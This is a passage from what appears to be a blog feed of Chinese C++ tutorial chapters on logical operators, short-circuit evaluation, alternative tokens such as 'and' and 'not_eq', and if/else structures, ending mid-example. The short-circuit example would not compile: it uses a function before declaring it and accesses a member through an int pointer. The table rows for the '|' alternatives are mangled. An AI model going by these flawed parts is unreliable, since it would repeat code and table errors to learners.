<code>&amp;&amp;</code></li><li> 逻辑或 <code>||</code></li><li> 赋值运算符 (<code>=</code>, <code>+=</code> 等)</li></ol><p> <strong>建议:</strong> 当不确定优先级或为了提高可读性时，<strong>使用括号 <code>()</code></strong> 来明确指定运算顺序。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((age &gt;= <span class="number">18</span> &amp;&amp; age &lt; <span class="number">65</span>) || is_student) &#123; ... &#125; <span class="comment">// 括号明确了 &amp;&amp; 先于 ||</span></span><br></pre></td></tr></table></figure></li><li><p><strong>短路求值 (Short-Circuit Evaluation):</strong></p><ul><li><p>  <strong><code>&amp;&amp;</code> (逻辑与):</strong> 如果 <code>&amp;&amp;</code> 的<strong>左侧</strong>操作数计算结果为 <code>false</code>，则<strong>右侧</strong>操作数<strong>不会</strong>被计算。因为无论右侧是什么，整个表达式的结果都必然是 <code>false</code>。</p></li><li><p><strong><code>||</code> (逻辑或):</strong> 如果 <code>||</code> 的<strong>左侧</strong>操作数计算结果为 <code>true</code>，则<strong>右侧</strong>操作数<strong>不会</strong>被计算。因为无论右侧是什么，整个表达式的结果都必然是 <code>true</code>。</p><p>短路求值非常重要，因为它：</p></li><li><p>  <strong>提高效率:</strong> 避免了不必要的计算。</p></li><li><p>  <strong>允许安全检查:</strong> 可以在检查指针有效性后才解引用它，或在除数非零时才执行除法。</p></li><li><p>*短路求值示例:**</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> divisor = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 安全的除法检查 (因为 divisor 为 0，右侧不会执行)</span></span><br><span class="line">    <span class="keyword">if</span> (divisor != <span class="number">0</span> &amp;&amp; value / divisor &gt; <span class="number">1</span>) &#123; </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Result is greater than 1.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Divisor is zero or result is not greater than 1.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *ptr = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="comment">// 安全的指针访问 (因为 ptr 为 nullptr，右侧不会执行)</span></span><br><span class="line">    <span class="keyword">if</span> (ptr != <span class="literal">nullptr</span> &amp;&amp; ptr-&gt;some_member == <span class="number">5</span>) &#123; </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pointer member is 5.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pointer is null or member is not 5.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// || 的短路 (因为 ++count &gt; 0 为 true，右侧不会执行)</span></span><br><span class="line">    <span class="keyword">if</span> (++count &gt; <span class="number">0</span> || some_expensive_function()) &#123; </span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Condition met. Count is &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// count 变为 1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">some_expensive_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Expensive function called!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 这行不会被打印</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="6-2-6-其他表示方式"><a href="#6-2-6-其他表示方式" class="headerlink" title="6.2.6 其他表示方式"></a>6.2.6 其他表示方式</h2><p>为了兼容某些可能缺少 <code>|</code>, <code>&amp;</code>, <code>!</code> 字符的键盘或字符集，C++ 标准定义了一些替代表示（也称为 “digraphs” 或 “alternative tokens”）。这些是关键字，可以直接使用，无需包含特殊头文件。</p><table><thead><tr><th align="left">逻辑运算符</th><th align="left">替代表示</th></tr></thead><tbody><tr><td align="left"><code>&amp;&amp;</code></td><td align="left"><code>and</code></td></tr><tr><td align="left">`</td><td align="left"></td></tr><tr><td align="left"><code>!</code></td><td align="left"><code>not</code></td></tr><tr><td align="left"><code>&amp;=</code></td><td align="left"><code>and_eq</code></td></tr><tr><td align="left">`</td><td align="left">=`</td></tr><tr><td align="left"><code>^=</code></td><td align="left"><code>xor_eq</code></td></tr><tr><td align="left"><code>~</code></td><td align="left"><code>compl</code></td></tr><tr><td align="left"><code>&amp;</code></td><td align="left"><code>bitand</code></td></tr><tr><td align="left">`</td><td align="left">`</td></tr><tr><td align="left"><code>^</code></td><td align="left"><code>xor</code></td></tr><tr><td align="left"><code>!=</code></td><td align="left"><code>not_eq</code></td></tr></tbody></table><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">5</span>, y = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用替代表示</span></span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">0</span> <span class="keyword">and</span> y &lt; <span class="number">20</span>) &#123; <span class="comment">// 等价于 x &gt; 0 &amp;&amp; y &lt; 20</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Condition (and) is true.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">0</span> <span class="keyword">or</span> y == <span class="number">10</span>) &#123; <span class="comment">// 等价于 x &lt; 0 || y == 10</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Condition (or) is true.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> flag) &#123; <span class="comment">// 等价于 !flag</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Condition (not) is true.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (x <span class="keyword">not_eq</span> y) &#123; <span class="comment">// 等价于 x != y</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Condition (not_eq) is true.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然这些替代表示是合法的 C++，但在现代编程实践中，直接使用符号运算符 (<code>&amp;&amp;</code>, <code>||</code>, <code>!</code>) 更为常见和普遍接受。除非有特定的编码标准或环境限制要求使用替代表示，否则通常坚持使用符号运算符。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.1 if语句</title>
      <link href="2025/04/26/6.1_if%E8%AF%AD%E5%8F%A5/"/>
      <url>2025/04/26/6.1_if%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<p>分支语句允许程序根据特定条件选择执行不同的代码路径。<code>if</code> 语句是 C++ 中最基本的分支结构，它允许程序根据一个<strong>条件表达式 (Condition)</strong> 的真假来决定是否执行某段代码。</p><p><strong>基本语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    <span class="comment">// 如果 condition 为 true，则执行这里的语句</span></span><br><span class="line">    statement1;</span><br><span class="line">    statement2;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 或者如果只有一条语句</span></span><br><span class="line"><span class="keyword">if</span> (condition)</span><br><span class="line">    single_statement;</span><br></pre></td></tr></table></figure><ul><li>  <strong><code>condition</code></strong>: 一个求值为布尔值 (<code>true</code> 或 <code>false</code>) 的表达式。通常是关系表达式（如 <code>x &gt; 5</code>, <code>name == &quot;Alice&quot;</code>）或逻辑表达式。非零值被视为 <code>true</code>，零值被视为 <code>false</code>。</li><li>  <strong><code>&#123; ... &#125;</code></strong>: 花括号定义了一个语句块。如果条件为 <code>true</code>，则执行块内的所有语句。如果只有一条语句需要根据条件执行，可以省略花括号，但为了清晰和避免错误，<strong>通常推荐总是使用花括号</strong>。</li></ul><p><strong>执行流程:</strong></p><ol><li> 计算 <code>condition</code> 的值。</li><li> 如果 <code>condition</code> 为 <code>true</code>，执行 <code>if</code> 语句后面的语句（或语句块）。</li><li> 如果 <code>condition</code> 为 <code>false</code>，跳过 <code>if</code> 语句后面的语句（或语句块），继续执行 <code>if</code> 结构之后的代码。</li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temperature;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the current temperature (Celsius): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; temperature;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 简单的 if 语句</span></span><br><span class="line">    <span class="keyword">if</span> (temperature &gt; <span class="number">30</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;It&#x27;s hot outside!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Remember to stay hydrated.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (temperature &lt; <span class="number">10</span>)</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;It&#x27;s cold, wear a jacket!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 只有一条语句，可以省略花括号</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Temperature check finished.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，如果用户输入的 <code>temperature</code> 大于 30，会打印两条消息；如果小于 10，会打印另一条消息；否则，这些 <code>if</code> 块内的代码会被跳过。</p><h2 id="6-1-1-if-else语句"><a href="#6-1-1-if-else语句" class="headerlink" title="6.1.1 if else语句"></a>6.1.1 if else语句</h2><p><code>if</code> 语句允许我们在条件为真时执行代码，但如果我们希望在条件为假时执行<strong>另一段</strong>代码，就需要使用 <code>if else</code> 结构。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    <span class="comment">// 如果 condition 为 true，执行这里的语句块 (if block)</span></span><br><span class="line">    statement_block_1;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果 condition 为 false，执行这里的语句块 (else block)</span></span><br><span class="line">    statement_block_2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>执行流程:</strong></p><ol><li> 计算 <code>condition</code> 的值。</li><li> 如果 <code>condition</code> 为 <code>true</code>，执行 <code>if</code> 后面的语句块 (<code>statement_block_1</code>)，然后跳过 <code>else</code> 后面的语句块 (<code>statement_block_2</code>)。</li><li> 如果 <code>condition</code> 为 <code>false</code>，跳过 <code>if</code> 后面的语句块 (<code>statement_block_1</code>)，执行 <code>else</code> 后面的语句块 (<code>statement_block_2</code>)。</li><li> 执行完选择的块后，程序继续执行 <code>if else</code> 结构之后的代码。</li></ol><p><strong>关键点:</strong> <code>if</code> 块和 <code>else</code> 块是<strong>互斥</strong>的，程序只会执行其中一个。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (age &gt;= <span class="number">18</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You are eligible to vote.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You are not yet eligible to vote.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">int</span> years_to_wait = <span class="number">18</span> - age;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You need to wait &quot;</span> &lt;&lt; years_to_wait &lt;&lt; <span class="string">&quot; more year(s).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age check complete.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序会根据用户输入的年龄，打印两条不同的消息之一。</p><h2 id="6-1-2-格式化if-else语句"><a href="#6-1-2-格式化if-else语句" class="headerlink" title="6.1.2 格式化if else语句"></a>6.1.2 格式化if else语句</h2><p>清晰的代码格式对于可读性和可维护性至关重要。对于 <code>if else</code> 语句，推荐遵循以下格式化约定：</p><ol><li> <strong>使用花括号 <code>&#123;&#125;</code>:</strong> 即使 <code>if</code> 或 <code>else</code> 后面只有一条语句，也推荐使用花括号。这可以防止在后续添加代码时引入悬挂 <code>else</code> (dangling else) 等错误，并使代码结构更清晰。</li><li> <strong>缩进:</strong> <code>if</code> 和 <code>else</code> 块内部的语句应该相对于 <code>if</code> 和 <code>else</code> 关键字进行缩进（通常是 4 个空格或一个制表符）。</li><li> <strong><code>else</code> 的位置:</strong> <code>else</code> 关键字通常与对应的 <code>if</code> 语句的右花括号 <code>&#125;</code> 放在同一行，或者单独放在下一行并与 <code>if</code> 对齐。两种风格都很常见。</li></ol><p><strong>示例 (推荐的格式):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 风格 1: else 与 if 的 &#125; 在同一行</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    <span class="comment">// ... statements ...</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="comment">// ... statements ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 风格 2: else 单独一行，与 if 对齐</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    <span class="comment">// ... statements ...</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ... statements ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不推荐的格式 (即使只有一条语句)</span></span><br><span class="line"><span class="comment">// if (condition) statement1; else statement2; // 可读性差，易出错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 推荐的格式 (即使只有一条语句)</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    statement1;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    statement2;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>悬挂 <code>else</code> 问题:</strong></p><p>当 <code>if</code> 语句嵌套且省略花括号时，<code>else</code> 会与<strong>最近的未匹配的 <code>if</code></strong> 相关联，这可能不符合预期。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误的意图 (可能想让 else 对应外层 if)</span></span><br><span class="line"><span class="keyword">if</span> (a &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> (b &gt; <span class="number">0</span>) </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Both positive&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">// 这个 else 实际上对应的是 if (b &gt; 0)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a is not positive&quot;</span>; <span class="comment">// 这行不会按预期执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确的写法 (使用花括号明确关联)</span></span><br><span class="line"><span class="keyword">if</span> (a &gt; <span class="number">0</span>) &#123; <span class="comment">// 外层 if</span></span><br><span class="line">    <span class="keyword">if</span> (b &gt; <span class="number">0</span>) &#123; <span class="comment">// 内层 if</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Both positive&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// 没有 else 对应内层 if</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 这个 else 对应外层 if (a &gt; 0)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a is not positive&quot;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>始终使用花括号可以完全避免悬挂 <code>else</code> 问题。</p><h2 id="6-1-3-if-else-if-else结构"><a href="#6-1-3-if-else-if-else结构" class="headerlink" title="6.1.3 if else if else结构"></a>6.1.3 if else if else结构</h2><p>当需要从多个互斥的选项中选择一个执行路径时，可以使用 <code>if else if else</code> 结构。它本质上是一系列嵌套的 <code>if else</code> 语句，但通常写成更扁平的结构。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition1) &#123;</span><br><span class="line">    <span class="comment">// 如果 condition1 为 true，执行这里的语句块</span></span><br><span class="line">    statement_block_1;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (condition2) &#123;</span><br><span class="line">    <span class="comment">// 如果 condition1 为 false 且 condition2 为 true，执行这里的语句块</span></span><br><span class="line">    statement_block_2;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (condition3) &#123;</span><br><span class="line">    <span class="comment">// 如果 condition1 和 condition2 都为 false 且 condition3 为 true，执行这里的语句块</span></span><br><span class="line">    statement_block_3;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// ... 可以有更多的 else if 分支</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果以上所有条件都为 false，执行这里的语句块 (可选的默认分支)</span></span><br><span class="line">    statement_block_default;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>执行流程:</strong></p><ol><li> 从上到下依次检查每个 <code>if</code> 和 <code>else if</code> 的条件。</li><li> 一旦找到第一个为 <code>true</code> 的条件，就执行其对应的语句块。</li><li> 执行完该块后，<strong>跳过</strong>所有剩余的 <code>else if</code> 和 <code>else</code> 分支，直接执行整个 <code>if else if else</code> 结构之后的代码。</li><li> 如果所有的 <code>if</code> 和 <code>else if</code> 条件都为 <code>false</code>，则执行最后的 <code>else</code> 块（如果存在）。如果不存在最后的 <code>else</code> 块，则整个结构什么也不执行。</li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your numerical score (0-100): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; score;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> grade;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (score &lt; <span class="number">0</span> || score &gt; <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid score entered.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        grade = <span class="string">&#x27;I&#x27;</span>; <span class="comment">// Invalid</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">        grade = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        grade = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">        grade = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        grade = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// score &lt; 60</span></span><br><span class="line">        grade = <span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (grade != <span class="string">&#x27;I&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Your grade is: &quot;</span> &lt;&lt; grade &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span 